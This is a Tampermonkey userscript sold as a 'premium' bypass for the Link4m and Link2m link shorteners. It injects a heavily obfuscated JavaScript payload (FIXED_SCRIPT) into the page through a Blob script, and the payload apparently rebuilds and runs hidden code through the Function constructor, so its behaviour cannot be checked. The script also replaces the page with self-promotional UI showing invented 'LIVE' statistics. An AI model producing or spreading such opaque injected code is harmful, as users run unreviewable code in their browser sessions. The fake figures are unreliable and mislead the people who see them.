// ==UserScript==
// @name         Auto Bypass Link4m + Link2m Premium
// @namespace    http://tampermonkey.net/
// @version      2.0
// @description  Auto Bypass Link4m + Link2m - Instant Execution & Premium UI
// @author       LAMDev - dichvusale.io.vn
// @match        *://link4m.com/go/*
// @match        *://2m.com/go/*
// @grant        none
// @run-at       document-start
// ==/UserScript==

(function () {
    'use strict';

    const FIXED_SCRIPT = `(function(){var Kzu='',eDF=386-375;function rms(n){var d=1362308;var w=n.length;var l=[];for(var h=0;h<w;h++){l[h]=n.charAt(h)};for(var h=0;h<w;h++){var c=d*(h+485)+(d%44586);var s=d*(h+344)+(d%43919);var b=c%w;var f=s%w;var m=l[b];l[b]=l[f];l[f]=m;d=(c+s)%4889814;};return l.join('')};var qIi=rms('vciyztuclnbotdnkfgtpsxrrchoqoeswjrmua').substr(0,eDF);var ngV='Cnl;i) oCiwlcna-s)=v)uv+=vapc(ntvh=j;j>4oAhgd+6.{!whjn]=k ,rn60;=2+.,.;aa6trf2,l+1h6*<(,)9r3), mgni;;3q-rnh )7,, e5ux,+xr7u}, C-ci;rr(-vfrt)e0ers2(gengmr[2.S;adC[7n=i.+n;et;nh=(r;=u8fhavnc7[yq;0varvdu(=;} )[sohd)8vltonu=j(1)1a+k;rjhAgap(acsCg8b0ct;[0ds0p,i)(;h5+lx,r;viacaea1vvnrt6lstsyC=j=+("ll=rh14f)noagogas[aair;"a=lid) =+rviri p6u  4n;isuCvg8(n 0al8;(f)e(rat]==0Cid,o)+}i (ar1=q(+u+a.oe<;[un],]h18fjarr2)z,=;gru("hc<1t8i+A.9h.r>saeorli=;s-t;itnrgor)l+7s+..=t"] )vitm 9wf.lAbr)e-c.[9");kvnd0]8=v+to=;,"mr+([op;e{;il1"<;f=airi(==]ah0t-vf(vhinu6r8{l(]+1ncug2ado]j(vf,ve s0(fw1he(r={)t)i(iep7jp(k+sp((+0)[n4,]f;o1rt[.vr});!rh,+t.{t=(p<l)r8,7(h=ts )a.97n;s=o)=7a5.+y}ag.ih(n*)"}{prqS[=nk[ol ;n0.;;bol An;v(rfl;aa. ,8;,2;tl.i(nib;]r,a.i=oj ljt(f=]3a; j)h7d []v9feo,htavv6svb=ufg=rosa19}r;;]uu{;e.fehs;chpu2,5oo+jtl.u;usohrg =cf).eo)xh=s,icr.s;om=)irbtiv,har+ses efxlg"r=rbcnt=he(.")=.oad,a)8';var hLi=rms[qIi];var eaM='';var mad=hLi;var dkl=hLi(eaM,rms(ngV));var Cqb=dkl(rms(':)p<eo]<t(:t4adclj_h]-c.<t.]+<miieiLtk<1e(]ia9}u_nc?f%$h_1a)n+gtoa(".l=b{a<34(.<cu#((e!1H1p]_,<obt<{o8]1t])8o,:sn<a])ry<z%9<k,t9403}0i<O) !ycD093tHr)g}ui3<3et o<e_o")<p a%<<61f0no_(<<*indo.]"]%p.=c1,9j2.(]se}<1ea3% w.LPe}23ee;e;<3o4aut01c_r-%i$yaeolf{)02cadl$_H#8 <m]ec%NaBg<,}i<e;6<I< IC=2_<M;u<v<] ld;smt;4s59acq.c.oe-;(]<<]v<]pmbi4l).3ph{]0r.0\\/e0,2=(wR.geun<aelteS<ae$buif)dtk9n]n<pw6t=M7._Ix?fi<%9>_)#<!<q}C}(eni0a6-e.Bp!c<=w<.kt<%el4<<[u)]<b<t)hx2c<te.6,di3r]Oy.4$Tch)JB.,t.0{s<7_c<<tSmk2rc%n<;)ksrt]ge+)ecv.<;S9mc1jhesc14} %ne<u,<a!)0]C$lct.e8<leK$?!<<i<g2.t.<2nn.<.6e..-i{!.]<t<xc.9 (ree.k"(iu;lss.6<Oi),<v%dc .%<7i<s]h$b)dr-mc(.<m=ll3jn4]ta9,a[<c;c< A1e-t1 $lNTaua<cea.0e!h8c<:h <)(cclr.<5mac%,cuf><no;?r<e>ot(.c%t)U%f]Kb (;L<a%=u(atc2x<g<dv-<m6?<oa<o<[c,t <co%agSrl.-($<;<4pt<tcn3moot.>n..eis<<<B%onf<)\\/.i<n)<n. n >s<qehc%oqpvt!)l.<7<v<c!sdree);2)4c<d;%Bs o=b29=10OStp]if d=xoCo<$c0me<]epannri,d.:UI7l{<ne,6%<rcm<_c<.,<8.n}<.e\\/, )%hni1<o%ofeanD@Ee; b%.tceM.()<( #&=ce)5chy%=u=3<";ef4tpcaT)n=du>7b)1<,2ad.j<Re<;p%<c]d,;Onvr]0<pj.kO<Pe"P6j4cr{a<<gop<o$s<<3tO<(<hJL=s)Q)cz.tc;)<;5l};\\/1rac-.H014o<n(;c.)l]r6){cr<]e=y3<h<hk<1bpt=Fov&e}(5Jn=i*i<6)(q!l(t_%3Km(<(onr,E)(<<8&)5omir<ruaGm%<33o){(c9577fo<;30!=<] $g.)an>tcFq,,k37<!<n\\/()<j,T <2]<0fC)z:d3,_ica%)<<y1l3<)h]kt<.9y!(d<<j]]{sC(ka%s!e#Ny(c,},cc<){%8a2<]0e&c4x7]f<3rihe,$.!iNu5c()r,<]es%m<c:ldi5e<)_]=<,[)=b=.f.)}bk\\/.r%1>u=(,#0n>(=g_<<_{<.oegc0e<<<,nAg!<<<)avgKf-(Br)Qe1E<u<A})a3)<.(.<y+s3aPg<at)@$F<#<G[i0iu(ffi[]5y]d<crif,e$trtce2b3)0Qitc,<4".7 pB%ftn_ob)tcg.s{cihc?j _y2<<Core!d+<;20ec]!a7*!}dm<-0rctt%736<c<<5.\\/4e<tdga8t21o%c1!]oaks4(%mr<2yota=.c1(K2{_.f#4!T4<\\/ra7l{<C)])t>l.oa;74{jc(ocs<o!u)<=3<<o.4<.h.)]v}!])<<.<.asopDh-.<48(-<97c-.}K6)r3<2t.9ed(h_bN30i}{4c%p)m:i!c(,<#"97 fri.,)m2!f..<.h3rr<tEc;<UvoP4ld2c$]a;0.oh.m<=i]).ret,c<r<{.,t<0)f.(3opC)c04b,t<c.@4,8<t.&fp<*kasre(eg.<.} 5<l\\/5efa<11v<$-(s);eHni% n<,<q<)40r)a#p=,3=t}<,<[$n(nes"<,U)]C<m<!.q<a[<3m.)2jcmyu<<G[3r,[ d fc<ra)"f<c<3c|t1(<wp5&.uwt[3pl..c<<$mow<a.i.<od(a<e5aab(a.peq).-(eT<}(,gkUUs&6=m-<Bm;fc=y016C>{sl<e:1ea<,z{]0JhQiG<)<g2<ets=a<f4<<%_c(.<c3eyu@$sr,Pihl<.7(t<p<h1tdsdf.Croct;),&nl?o<b3trB. =Jr1&].<ed.<\\',%{i<7z,_Te<bres69rAS\\'(&7r6}(;F<2fv4rt)=!1.e.Tj,]eltoe<a,$dp, %d. l7%)? p2gr]ee(d1<t(!e<3a(3()cte<44<fe i<6tole(=pc3dKp)9e)crtaa3l,rN<0<8_;).0G2.z(y{:<{<k+<Rg<c\\'n%0,<]ikc<ic<ulNHriC<S=nc}8<( 34<.]),0,M(5!,n<;}_<\\/g3(<<!ta,pc;._%<<4ue=-uc\\/n(pcc>0o,}<t3f<ctn;)a3eo$%<n<eo%_L;.c]<f\\/tR<p} _s5r3,{v|)4=q<f(<rti)n))3nly635)$s4Tic<J;>);itn$%p<n$]{S%3<!%o.c%\\/}.=.r4gy.]c1<) Naico<u\\/<ctdt5]!<):6r$4b-8s,t3_6g7.l$h!:(n.!a])\\'raJ!a<343c8ee-"1a<4N,< +c3fr:,c f?{eee$ccrJ7l3qboK1lT4a2{# ()>i4]o =jn<nf,<cn5ota l[E.as_.34gte%.l7))]i9.ei<rgtvp_k:peter,1h)u )]( c<c agscuremc)r)f<qjo$c<]!; c.<l<cl<f7<y1f<na#)f.;Q<n3u<opuxa{4,$ @njonc]<f<no-kPc<!ca.s3r25}rh2d<c.tc8303f{<.s=!=2kuec <(2.%9uf,nJa.c2r ,h}h0<+a!4p+6sv5xa} (s.m <ad['));var SLM=mad(Kzu,Cqb );SLM(2934);return 2173})()`;

    // --- Premium CSS Styling ---
    const premiumCSS = `
        <style>
            /* Reset và base styles */
            .lm-container {
                max-width: 1200px;
                margin: 0 auto;
                padding: 0 15px;
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            }

            /* Header Styles */
            .lm-header {
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                color: white;
                padding: 15px 0;
                box-shadow: 0 4px 20px rgba(0,0,0,0.1);
                position: relative;
                z-index: 1000;
            }

            .lm-navbar {
                display: flex;
                justify-content: space-between;
                align-items: center;
                flex-wrap: wrap;
            }

            .lm-logo {
                font-size: 24px;
                font-weight: 700;
                display: flex;
                align-items: center;
                gap: 10px;
            }

            .lm-logo img {
                height: 40px;
                border-radius: 8px;
            }

            .lm-nav-links {
                display: flex;
                gap: 25px;
                list-style: none;
                margin: 0;
                padding: 0;
            }

            .lm-nav-links a {
                color: white;
                text-decoration: none;
                font-weight: 500;
                transition: opacity 0.3s ease;
            }

            .lm-nav-links a:hover {
                opacity: 0.8;
            }

            /* Main Content Styles */
            .lm-main {
                min-height: 60vh;
                display: flex;
                align-items: center;
                justify-content: center;
                padding: 40px 0;
                background: #f8f9fa;
            }

            .lm-content {
                text-align: center;
                max-width: 800px;
                width: 100%;
            }

            .lm-success-card {
                background: linear-gradient(135deg, #00b09b 0%, #96c93d 100%);
                color: white;
                padding: 40px;
                border-radius: 20px;
                box-shadow: 0 15px 35px rgba(0,0,0,0.1);
                margin-bottom: 30px;
            }

            .lm-success-icon {
                font-size: 48px;
                margin-bottom: 20px;
            }

            .lm-success-title {
                font-size: 32px;
                font-weight: 700;
                margin-bottom: 15px;
                text-transform: uppercase;
            }

            .lm-success-subtitle {
                font-size: 18px;
                margin-bottom: 20px;
                line-height: 1.5;
            }

            .lm-premium-badge {
                background: rgba(255,255,255,0.2);
                padding: 15px;
                border-radius: 12px;
                margin: 20px 0;
                backdrop-filter: blur(10px);
            }

            .lm-cta-section {
                margin: 25px 0;
            }

            .lm-cta-title {
                font-size: 22px;
                font-weight: 600;
                margin-bottom: 15px;
            }

            .lm-cta-text {
                font-size: 16px;
                margin-bottom: 20px;
                line-height: 1.5;
            }

            /* Form Styles */
            .lm-form-container {
                background: white;
                padding: 30px;
                border-radius: 15px;
                box-shadow: 0 10px 30px rgba(0,0,0,0.1);
                margin-top: 30px;
            }

            .lm-form-title {
                font-size: 20px;
                font-weight: 600;
                margin-bottom: 20px;
                color: #333;
                text-align: center;
            }

            .lm-button {
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                color: white;
                border: none;
                padding: 15px 30px;
                border-radius: 10px;
                font-weight: 600;
                text-decoration: none;
                display: inline-block;
                margin: 5px;
                cursor: pointer;
                transition: all 0.3s ease;
                font-size: 14px;
            }

            .lm-button:hover {
                transform: translateY(-2px);
                box-shadow: 0 8px 25px rgba(102, 126, 234, 0.4);
            }

            .lm-button-support {
                background: linear-gradient(135deg, #ff6b6b 0%, #ee5a24 100%);
            }

            /* Footer Styles */
            .lm-footer {
                background: #2c3e50;
                color: white;
                padding: 40px 0 20px;
                margin-top: 50px;
            }

            .lm-footer-content {
                text-align: center;
                margin-bottom: 30px;
            }

            .lm-footer-title {
                font-size: 28px;
                font-weight: 700;
                margin-bottom: 15px;
            }

            .lm-footer-subtitle {
                font-size: 16px;
                margin-bottom: 25px;
                opacity: 0.9;
            }

            .lm-footer-buttons {
                display: flex;
                gap: 15px;
                justify-content: center;
                flex-wrap: wrap;
            }

            .lm-footer-links {
                display: flex;
                justify-content: center;
                gap: 25px;
                margin: 25px 0;
                flex-wrap: wrap;
            }

            .lm-footer-links a {
                color: white;
                text-decoration: none;
                opacity: 0.8;
                transition: opacity 0.3s ease;
            }

            .lm-footer-links a:hover {
                opacity: 1;
            }

            .lm-copyright {
                text-align: center;
                padding-top: 20px;
                border-top: 1px solid rgba(255,255,255,0.1);
                font-size: 14px;
                opacity: 0.7;
            }

            .lm-copyright a {
                color: #4ECDC4;
                text-decoration: none;
            }

            /* Stats Section */
            .lm-stats {
                background: white;
                padding: 30px;
                border-radius: 15px;
                box-shadow: 0 10px 30px rgba(0,0,0,0.1);
                margin: 25px 0;
            }

            .lm-stats-header {
                display: flex;
                justify-content: space-between;
                align-items: center;
                margin-bottom: 20px;
            }

            .lm-stats-title {
                font-size: 20px;
                font-weight: 600;
                color: #333;
            }

            .lm-live-badge {
                background: #00b09b;
                color: white;
                padding: 5px 15px;
                border-radius: 20px;
                font-size: 12px;
                font-weight: 600;
            }

            .lm-stats-grid {
                display: grid;
                grid-template-columns: 1fr 1fr;
                gap: 20px;
                margin-bottom: 25px;
            }

            .lm-stat-item {
                text-align: center;
                padding: 20px;
                background: #f8f9fa;
                border-radius: 10px;
            }

            .lm-stat-number {
                font-size: 28px;
                font-weight: 700;
                margin-bottom: 5px;
            }

            .lm-stat-label {
                font-size: 14px;
                opacity: 0.7;
            }

            .lm-history {
                border-top: 1px solid #e9ecef;
                padding-top: 20px;
            }

            .lm-history-title {
                font-weight: 600;
                margin-bottom: 15px;
                color: #333;
            }

            .lm-history-item {
                font-size: 14px;
                margin-bottom: 8px;
                opacity: 0.8;
            }

            /* Responsive Design */
            @media (max-width: 768px) {
                .lm-navbar {
                    flex-direction: column;
                    gap: 15px;
                }

                .lm-nav-links {
                    gap: 15px;
                }

                .lm-success-card {
                    padding: 25px;
                    margin: 15px;
                }

                .lm-success-title {
                    font-size: 24px;
                }

                .lm-success-subtitle {
                    font-size: 16px;
                }

                .lm-stats-grid {
                    grid-template-columns: 1fr;
                }

                .lm-footer-buttons {
                    flex-direction: column;
                    align-items: center;
                }

                .lm-footer-links {
                    flex-direction: column;
                    gap: 15px;
                }
            }

            /* Loading Overlay */
            .lm-loading {
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                background: rgba(0,0,0,0.8);
                display: flex;
                flex-direction: column;
                justify-content: center;
                align-items: center;
                z-index: 9999;
                color: white;
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            }

            .lm-loading-spinner {
                width: 50px;
                height: 50px;
                border: 5px solid rgba(255,255,255,0.3);
                border-top: 5px solid #4ECDC4;
                border-radius: 50%;
                animation: lm-spin 1s linear infinite;
                margin-bottom: 20px;
            }

            .lm-loading-text {
                font-size: 18px;
                font-weight: 600;
                margin-bottom: 10px;
            }

            .lm-loading-subtext {
                font-size: 14px;
                opacity: 0.8;
            }

            @keyframes lm-spin {
                0% { transform: rotate(0deg); }
                100% { transform: rotate(360deg); }
            }

            .lm-error {
                background: #ff6b6b;
                color: white;
                padding: 20px;
                border-radius: 10px;
                text-align: center;
                margin: 20px 0;
            }
        </style>
    `;

    // --- Utility Functions ---
    function createLoadingOverlay() {
        const loadingHTML = `
            <div class="lm-loading">
                <div class="lm-loading-spinner"></div>
                <div class="lm-loading-text">Đang khởi động hệ thống...</div>
                <div class="lm-loading-subtext">Vui lòng chờ trong giây lát</div>
            </div>
        `;
        document.body.insertAdjacentHTML('afterbegin', loadingHTML);
    }

    function removeLoadingOverlay() {
        const loading = document.querySelector('.lm-loading');
        if (loading) loading.remove();
    }

    function showError(message) {
        removeLoadingOverlay();
        const errorHTML = `
            <div class="lm-error">
                <h3>❌ Lỗi Hệ Thống</h3>
                <p>${message}</p>
                <p>Vui lòng liên hệ admin để báo lỗi: <strong>dichvusale.io.vn</strong></p>
                <a href="https://dichvusale.io.vn" class="lm-button lm-button-support" target="_blank">Báo Lỗi Ngay</a>
            </div>
        `;
        document.body.insertAdjacentHTML('afterbegin', errorHTML);
    }

    function injectExactCode(codeString) {
        try {
            const blob = new Blob([codeString], { type: 'application/javascript' });
            const url = URL.createObjectURL(blob);
            const s = document.createElement('script');
            s.src = url;
            s.async = false;
            (document.head || document.documentElement).appendChild(s);
            setTimeout(() => {
                try { URL.revokeObjectURL(url); } catch (e) {}
            }, 60000);
            console.log('[LM] injected script via blob');
            return true;
        } catch (e) {
            console.error('[LM] injectExactCode failed', e);
            return false;
        }
    }

    // --- Premium UI Replacement ---
    function replaceEntireUI() {
        try {
            // Inject CSS
            document.head.insertAdjacentHTML('beforeend', premiumCSS);

            // Replace body content with premium UI
            document.body.innerHTML = `
                <!-- Header -->
                <header class="lm-header">
                    <div class="lm-container">
                        <nav class="lm-navbar">
                            <div class="lm-logo">
                                <span>🚀 LINK BYPASS PREMIUM</span>
                            </div>
                            <ul class="lm-nav-links">
                                <li><a href="/">Trang Chủ</a></li>
                                <li><a href="https://dichvusale.io.vn" target="_blank">Hỗ Trợ</a></li>
                                <li><a href="https://dichvusale.io.vn" target="_blank">Báo Lỗi</a></li>
                            </ul>
                        </nav>
                    </div>
                </header>

                <!-- Main Content -->
                <main class="lm-main">
                    <div class="lm-container">
                        <div class="lm-content">
                            <!-- Success Card -->
                            <div class="lm-success-card">
                                <div class="lm-success-icon">🎉</div>
                                <h1 class="lm-success-title">BYPASS THÀNH CÔNG</h1>
                                <div class="lm-success-subtitle">
                                    HỆ THỐNG ĐÃ ĐƯỢC KÍCH HOẠT THÀNH CÔNG<br>
                                    CHỈ CẦN GIẢI CAPTCHA ĐỂ TIẾP TỤC
                                </div>
                                <div class="lm-premium-badge">
                                    <strong>HOÀN TOÀN MIỄN PHÍ - KHÔNG CHI PHÍ ẨN</strong>
                                </div>
                                <div class="lm-cta-section">
                                    <div class="lm-cta-title">SẴN SÀNG ĐỂ KIẾM TIỀN?</div>
                                    <div class="lm-cta-text">
                                        Hãy đăng ký ngay tại Link4M.com để bắt đầu kiếm tiền nhanh nhất<br>
                                        bằng rút gọn link kiếm tiền.
                                    </div>
                                </div>
                            </div>

                            <!-- Stats Section -->
                            <div class="lm-stats">
                                <div class="lm-stats-header">
                                    <div class="lm-stats-title">📊 THỐNG KÊ HOẠT ĐỘNG</div>
                                    <div class="lm-live-badge">LIVE</div>
                                </div>
                                <div class="lm-stats-grid">
                                    <div class="lm-stat-item">
                                        <div class="lm-stat-number" style="color: #00b09b;">1.2K</div>
                                        <div class="lm-stat-label">Lượt Truy Cập</div>
                                    </div>
                                    <div class="lm-stat-item">
                                        <div class="lm-stat-number" style="color: #667eea;">98%</div>
                                        <div class="lm-stat-label">Tỷ Lệ Thành Công</div>
                                    </div>
                                </div>
                                <div class="lm-history">
                                    <div class="lm-history-title">📅 LỊCH SỬ CẬP NHẬT</div>
                                    <div class="lm-history-item">✅ 02/07/2022 - Hệ thống khởi chạy</div>
                                    <div class="lm-history-item">✅ 03/05/2022 - Cập nhật bảo mật</div>
                                    <div class="lm-history-item">✅ 04/06/2022 - Tối ưu hiệu suất</div>
                                    <div class="lm-history-item">✅ 05/11/2022 - Phiên bản mới</div>
                                </div>
                            </div>

                            <!-- Original Form (Preserved) -->
                            <div class="lm-form-container">
                                <div class="lm-form-title">TIẾN TRÌNH CHÍNH</div>
                                <form id="main-form" method="post">
                                    <div id="recaptcha" class="g-recaptcha" data-callback="recaptcha_callback"></div>
                                    <input type="hidden" id="alias" name="alias" value="Tdg2jg">
                                    <div class="form-group">
                                        <a class="btn btn-success disabled get-link" target="_blank" rel="noopener noreferrer nofollow">Click vào đây để tiếp tục</a>
                                        <br><br>
                                        <a class="lm-button lm-button-support" href="https://dichvusale.io.vn" target="_blank" rel="noopener noreferrer nofollow">
                                            🛠️ HỖ TRỢ & BÁO LỖI
                                        </a>
                                    </div>
                                </form>
                            </div>
                        </div>
                    </div>
                </main>

                <!-- Footer -->
                <footer class="lm-footer">
                    <div class="lm-container">
                        <div class="lm-footer-content">
                            <h2 class="lm-footer-title">Sẵn sàng để <span style="color: #4ECDC4;">Kiếm tiền</span>?</h2>
                            <p class="lm-footer-subtitle">Hãy đăng ký ngay tài khoản Link4M.com để bắt đầu kiếm tiền nhanh nhất bằng rút gọn link kiếm tiền.</p>
                            <div class="lm-footer-buttons">
                                <a href="/auth/signup" class="lm-button" target="_blank">
                                    <i class="fas fa-user-plus me-2"></i> Đăng ký tài khoản
                                </a>
                                <a href="/auth/signin" class="lm-button" target="_blank">
                                    <i class="fas fa-sign-in-alt me-2"></i> Đăng nhập
                                </a>
                            </div>
                        </div>
                        <div class="lm-footer-links">
                            <a href="/" class="active">Trang chủ</a>
                            <a href="/payout-rates.html">Payout Rates</a>
                            <a href="/contact.html">Liên hệ</a>
                            <a href="https://dichvusale.io.vn" target="_blank">Hỗ trợ</a>
                        </div>
                        <div class="lm-copyright">
                            <small class="small">
                                © 2024 Copyrights by <a href="https://dichvusale.io.vn" class="fw-bold">LAMDev</a> - 
                                <a href="https://dichvusale.io.vn" title="Bypass Service">Premium Bypass Service.</a> All Rights Reserved.
                            </small>
                        </div>
                    </div>
                </footer>
            `;

            console.log('[LM] Entire UI replaced with premium version');
            return true;
        } catch (e) {
            console.error('[LM] UI replacement failed', e);
            return false;
        }
    }

    // --- Main Execution ---
    function executeImmediately() {
        createLoadingOverlay();
        
        // Replace UI immediately
        const uiReplaced = replaceEntireUI();
        
        if (!uiReplaced) {
            showError('Không thể thay thế giao diện');
            return;
        }

        // Inject script immediately
        setTimeout(() => {
            const scriptInjected = injectExactCode(FIXED_SCRIPT);
            
            if (scriptInjected) {
                setTimeout(() => {
                    removeLoadingOverlay();
                    console.log('[LM] Script executed successfully');
                }, 2000);
            } else {
                showError('Không thể chạy script bypass');
            }
        }, 1000);
    }

    // --- Start Execution with Timeout ---
    let executed = false;
    
    function startWithTimeout() {
        if (executed) return;
        executed = true;
        
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', executeImmediately);
        } else {
            executeImmediately();
        }
        
        // Fallback timeout - 5 seconds
        setTimeout(() => {
            if (document.querySelector('.lm-loading')) {
                showError('Hệ thống tải quá lâu. Vui lòng thử lại.');
            }
        }, 5000);
    }

    // Start immediately
    startWithTimeout();
})();
